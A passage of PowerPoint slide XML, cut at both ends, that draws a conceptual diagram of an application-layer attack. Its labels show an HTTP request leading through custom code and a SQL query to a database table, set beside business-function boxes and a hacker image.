              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437276" name="Rectangle 28"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="4243388" y="2063750"/>
            <a:ext cx="1371600" cy="139700"/>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Web Services</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437277" name="Rectangle 29"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="4441825" y="2063750"/>
            <a:ext cx="1371600" cy="139700"/>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Directories</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437278" name="Rectangle 30"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="4641057" y="2064543"/>
            <a:ext cx="1371600" cy="138113"/>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Human Resrcs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437279" name="Rectangle 31"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="4840288" y="2063750"/>
            <a:ext cx="1371600" cy="139700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6699FF"/>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6699FF"/>
            </a:extrusionClr>
          </a:sp3d>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:flatTx/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1000">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Billing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437280" name="Line 32"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="5099050" y="2971800"/>
            <a:ext cx="6350" cy="2090738"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="127000">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437281" name="Rectangle 33"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm>
            <a:off x="2252663" y="2800350"/>
            <a:ext cx="1455737" cy="260350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="008000"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>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rgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Custom Code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="437282" name="Picture 34" descr="TN_hacker"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print">
            <a:lum bright="24000" contrast="42000"/>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="627063" y="1409700"/>
            <a:ext cx="1209675" cy="1462088"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437283" name="Freeform 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="3049588" y="3001963"/>
            <a:ext cx="935037" cy="2041525"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="68" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="135" y="1375"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="876" y="1551"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="876" h="1633">
                <a:moveTo>
                  <a:pt x="68" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="78" y="229"/>
                  <a:pt x="0" y="1117"/>
                  <a:pt x="135" y="1375"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="270" y="1633"/>
                  <a:pt x="722" y="1514"/>
                  <a:pt x="876" y="1551"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="101600" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF9900">
                <a:alpha val="60001"/>
              </a:srgbClr>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="med" len="med"/>
            <a:tailEnd type="none" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437284" name="Freeform 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipH="1">
            <a:off x="1968500" y="3001963"/>
            <a:ext cx="955675" cy="2041525"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="68" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="135" y="1375"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="876" y="1551"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="876" h="1633">
                <a:moveTo>
                  <a:pt x="68" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="78" y="229"/>
                  <a:pt x="0" y="1117"/>
                  <a:pt x="135" y="1375"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="270" y="1633"/>
                  <a:pt x="722" y="1514"/>
                  <a:pt x="876" y="1551"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="101600" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF0000">
                <a:alpha val="60001"/>
              </a:srgbClr>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="triangle" w="med" len="med"/>
            <a:tailEnd type="none" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437285" name="Freeform 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipH="1">
            <a:off x="4375150" y="3048000"/>
            <a:ext cx="658813" cy="1968500"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="68" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="135" y="1375"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="876" y="1551"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="876" h="1633">
                <a:moveTo>
                  <a:pt x="68" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="78" y="229"/>
                  <a:pt x="0" y="1117"/>
                  <a:pt x="135" y="1375"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="270" y="1633"/>
                  <a:pt x="722" y="1514"/>
                  <a:pt x="876" y="1551"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="101600" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF9900">
                <a:alpha val="60001"/>
              </a:srgbClr>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="triangle" w="med" len="med"/>
            <a:tailEnd type="none" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437286" name="Text Box 38"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="white">
          <a:xfrm>
            <a:off x="576263" y="2355850"/>
            <a:ext cx="1260475" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1000">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>APPLICATION</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1000">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1000">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>ATTACK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437287" name="Text Box 39"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="16200000">
            <a:off x="-344487" y="4838700"/>
            <a:ext cx="1455737" cy="284163"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Network Layer </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437288" name="Text Box 40"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="16200000">
            <a:off x="-450056" y="2080419"/>
            <a:ext cx="1670050" cy="284162"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Application Layer</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437289" name="Rectangle 41"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="1674019"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Accounts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437290" name="Rectangle 42"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="1857375" y="2043113"/>
            <a:ext cx="1316038" cy="125412"/>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Finance</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437291" name="Rectangle 43"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="2053432"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Administration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437292" name="Rectangle 44"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="2232025" y="2043113"/>
            <a:ext cx="1316038" cy="125412"/>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Transactions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437293" name="Rectangle 45"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="2428082"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Communication</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437294" name="Rectangle 46"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="2604294"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Knowledge Mgmt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437295" name="Rectangle 47"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="2788444"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E-Commerce</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437296" name="Rectangle 48"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="2974182" y="2043906"/>
            <a:ext cx="1316038" cy="123825"/>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a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Bus. Functions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437297" name="Rectangle 49"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="609600" y="1981200"/>
            <a:ext cx="838200" cy="950913"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EFEFFF"/>
          </a:solidFill>
          <a:ln w="38100" cmpd="dbl" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>HTTP request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t></a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="3200">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437298" name="Rectangle 50"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2819400" y="1944688"/>
            <a:ext cx="838200" cy="950912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EFEFFF"/>
          </a:solidFill>
          <a:ln w="38100" cmpd="dbl" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>SQL query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t></a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="3200" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437299" name="Rectangle 51"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4648200" y="1868488"/>
            <a:ext cx="838200" cy="950912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EFEFFF"/>
          </a:solidFill>
          <a:ln w="38100" cmpd="dbl" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>DB Table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
